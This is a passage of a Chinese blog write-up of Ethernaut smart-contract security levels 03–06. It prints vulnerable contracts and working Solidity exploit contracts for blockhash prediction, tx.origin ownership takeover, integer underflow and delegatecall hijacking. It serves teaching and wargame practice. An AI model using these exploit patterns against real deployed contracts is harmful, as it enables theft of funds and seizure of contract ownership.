hash_prediction=uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 num_prediction=hash_prediction.div(FACTOR);</span><br><span class="line">        bool result_prediction=num_prediction==1?true:false;//预知结果</span><br><span class="line">        if (result_prediction==true)&#123;</span><br><span class="line">            flip_coins(levelInstance).flip(true);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            flip_coins(levelInstance).flip(false);</span><br><span class="line">        &#125;//接口连接到智能合约，调用函数，填入预知结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写好代码后，ctrl+s编译，如果出现绿色对勾，说明编译无误；编译时记得选好编译器版本</p>
+<p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E7%BC%96%E8%AF%91%E5%99%A8.png" alt="编译器"></p>
+<p>然后部署合约,选Injected Provider，选好你要部署的合约，delpoy边上填入构造函数的参数</p>
+<p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A61.png" alt="部署合约1"></p>
+<p>在这里连续点击十次，调用十次函数即可</p>
+<p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0.png" alt="调用函数"></p>
+<p>知识点：solidity随机数生成机制；solidity函数；solidity接口；remix ide的用法；SafeMath库；solidity开源许可证；solidity编译器</p>
+<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a><strong>04 Telephone</strong></h2><p>这题没有明说，但是也是要获得合约所有权</p>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码相对简单，先在构造函数里初始化合约所有者为关卡地址，然后只有一个函数changeOwner，输入参数更改合约的所有者，条件是原始发起交易的账户tx.origin不是调用函数的实体，因此我们这里不能直接前端调用，只能写智能合约调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">interface telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;  </span><br><span class="line">&#125;</span><br><span class="line">contract calling&#123;</span><br><span class="line">    address lvlInstance;</span><br><span class="line">    constructor(address _lvlInstance) public&#123;</span><br><span class="line">        lvlInstance=_lvlInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    function CALLING(address _me) public &#123;</span><br><span class="line">        telephone(lvlInstance).changeOwner(_me);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后呼叫函数的时候填入自己的地址，改变所有权即可通关。</p>
+<p>知识点：利用tx.origin漏洞钓鱼攻击</p>
+<h2 id="05-token"><a href="#05-token" class="headerlink" title="05 token"></a><strong>05 token</strong></h2><p>这题的目标是想办法增加自己的balances，增加成功即可过关；源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造函数初始化了关卡地址的余额，并在题干告诉我们我们自己的余额是20，这两个数据都储存在balances这个映射内；然后定义一个transfer函数，规定调用函数实体账户内的余额必须大于转账的数值，才能调用函数，然后在balances映射内做出相应的变化；再定义一个balanceOf，可以查询balances内的余额</p>
+<p>想要增加余额，就必须写一份智能合约作为一个新的实体调用实例的智能合约把自己的余额分出来。但是虽然智能合约也只有20，但是实际上可以转出大于20的余额，因为这个合约没有用SafeMath，存在整数溢出漏洞，由于余额是无符号256位整数，那么即使我的_value&gt;20,由于uint256没有符数，所以会下溢出，最后如果 _value比较小，会得到一个很大的整数，总之require永远满足差值大于0，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.11;</span><br><span class="line">interface token_add &#123;</span><br><span class="line">    function transfer(address _to, uint256 _value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract give_me&#123;</span><br><span class="line">    address ether_instance;</span><br><span class="line">    constructor(address _ether_instance) public &#123;</span><br><span class="line">        ether_instance=_ether_instance;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_token(address my_add,uint256 value) public &#123;</span><br><span class="line">        token_add(ether_instance).transfer(my_add,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后调用get_token函数，转账即可</p>
+<p>知识点：solidity整数溢出漏洞</p>
+<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a><strong>06 Delegation</strong></h2><p>这题目标是获得合约的所有权。启动实例后输入contract.abi()，发现其指向是Delegation合约。整个的源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提示中有提到，delegatecall很关键，所以查一下delegatecall。发现delegatecall和call都是合约调用其外部代码的方法，还有一个callcode弃用了，就看前两个吧。delegatecall和call的区别在于，call是调用外部合约函数，改变外部合约状态，delegatecall是调用外部合约函数，改变自身合约状态。</p>
+<p>因此，我们可以用delegatecall调用Delegate合约的pwn()函数以改变owner的值，为此，我们需要触发fallback，所以我们要发起交易，且设定好msg.data，msg.data是原始调用数据，包含在交易中，其构成为函数选择器+参数编码，函数选择器即是 <strong>Keccak256 哈希的前 4 字节</strong>；参数编码是对参数值编码，可以分为定长类型和动态类型，定长类型包括uint256，address等等，动态类型包括数组，string和bytes等等。对于定长类型直接将数据补足到32位即可，动态类型要有偏移量，数据长度，和数据类型；将这些和函数选择器拼接起来后即为完整的msg.data</p>
+<p>pwn()没有参数，所以直接：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransacation</span>(&#123;<span class="attr">data</span>:<span class="number">0x5329b102</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>补充一点，调用delegatecall的时候需要注意储存布局的一致性。如果有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">	address admin;</span><br><span class="line">	address user;</span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">	address common_user_1;</span><br><span class="line">	address admin;</span><br><span class="line">	function setAdminAddress(address _AdminAddress)public&#123;</span><br><span class="line">		admin=_AdminAddress;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比如我需要调用合约B的函数给A的想给admin赋值，但实际上值会给到user。</p>
+<p>因为智能合约变量声明后会按顺序占据储存槽，所以函数在合约B实际上给储存槽1的变量赋值，对照到合约A就是user；</p>
+<p>所以如果要用delegatecall就必须保证储存布局一致，其中还包括数据类型也要一致。</p>
+<p>知识点：delegatecall和call函数的使用与区分；msg.data；delegatecall的储存布局一致性；引用其他合同的方法</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">M4nd3l3y3v</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/">http://example.com/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">第647号宇宙の研究所</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/blockchain/">blockchain</a></div><div class="post_share"><div class="social-share" data-image="/img/miku.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&amp;%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="区块链、以太坊、去中心化和web3.0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">区块链、以太坊、去中心化和web3.0</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="区块链、以太坊、去中心化和web3.0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-01</div><div class="title">区块链、以太坊、去中心化和web3.0</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/miku.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">M4nd3l3y3v</div><div class="author-info__description">Go and Hack, make my day!</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>关注我</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup"><span class="toc-number">1.</span> <span class="toc-text">Ethernaut区块链安全闯关00-06writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-Hello-Ethernaut"><span class="toc-number">1.1.</span> <span class="toc-text">00 Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-Fallback"><span class="toc-number">1.2.</span> <span class="toc-text">01 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-Fallout"><span class="toc-number">1.3.</span> <span class="toc-text">02 Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-CoinFlip"><span class="toc-number">1.4.</span> <span class="toc-text">03 CoinFlip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-Telephone"><span class="toc-number">1.5.</span> <span class="toc-text">04 Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-token"><span class="toc-number">1.6.</span> <span class="toc-text">05 token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-Delegation"><span class="toc-number">1.7.</span> <span class="toc-text">06 Delegation</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/" title="Ethernaut区块链安全闯关00-06writeup">Ethernaut区块链安全闯关00-06writeup</a><time datetime="2025-02-22T16:00:00.000Z" title="发表于 2025-02-23 00:00:00">2025-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&amp;%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="区块链、以太坊、去中心化和web3.0">区块链、以太坊、去中心化和web3.0</a><time datetime="2025-01-31T16:00:00.000Z" title="发表于 2025-02-01 00:00:00">2025-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/" title="2024“美亚杯”第十届中国电子数据取证大赛个人赛WP(缺少内存和恶意程序版)">2024“美亚杯”第十届中国电子数据取证大赛个人赛WP(缺少内存和恶意程序版)</a><time datetime="2024-12-31T16:00:00.000Z" title="发表于 2025-01-01 00:00:00">2025-01-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/" title="2024第四届全国网络空间取证竞赛(FIC)决赛writeup">2024第四届全国网络空间取证竞赛(FIC)决赛writeup</a><time datetime="2024-11-24T16:00:00.000Z" title="发表于 2024-11-25 00:00:00">2024-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/" title="2024警察大学第七届“精武杯”电子数据取证技能比武wp">2024警察大学第七届“精武杯”电子数据取证技能比武wp</a><time datetime="2024-11-03T16:00:00.000Z" title="发表于 2024-11-04 00:00:00">2024-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By M4nd3l3y3v</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'DM69jtfWLOcYvV8i9yrgZX0S-gzGzoHsz',
+      appKey: 'OP1XRWBGUD6PtmsJSQ1JS7dU',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
